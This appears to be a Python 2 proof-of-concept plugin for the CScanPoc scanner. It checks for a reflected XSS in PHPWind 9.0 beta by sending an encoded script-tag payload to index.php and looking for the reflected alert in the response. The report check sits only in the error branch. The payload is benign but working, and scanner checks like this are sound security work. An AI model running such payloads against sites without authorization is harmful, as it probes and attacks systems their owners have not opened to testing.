# coding: utf-8
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHPWind_0104'  # 平台漏洞编号，留空
    name = 'PHPWind 9.0 貝塔 反射XSS'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-12-11'  # 漏洞公布时间
    desc = '''
    PHPWind 9.0 貝塔 反射XSS。
    漏洞文件：index.php。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源http://wooyun.org/bugs/wooyun-2012-012163
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPWind'  # 漏洞应用名称
    product_version = '9.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4d125b1b-0cb7-407b-b0f3-d0880f948451'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/index.php?m=1%22%3E%3Cscript%3Ealert%28%22bb2%22%29%3C%2Fscript%3E%26c%3Dforum'
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            try:
                content = urllib2.urlopen(req).read()
            except urllib2.URLError, e:
                content = e.read()
                if '<script>alert("bb2")</script>' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
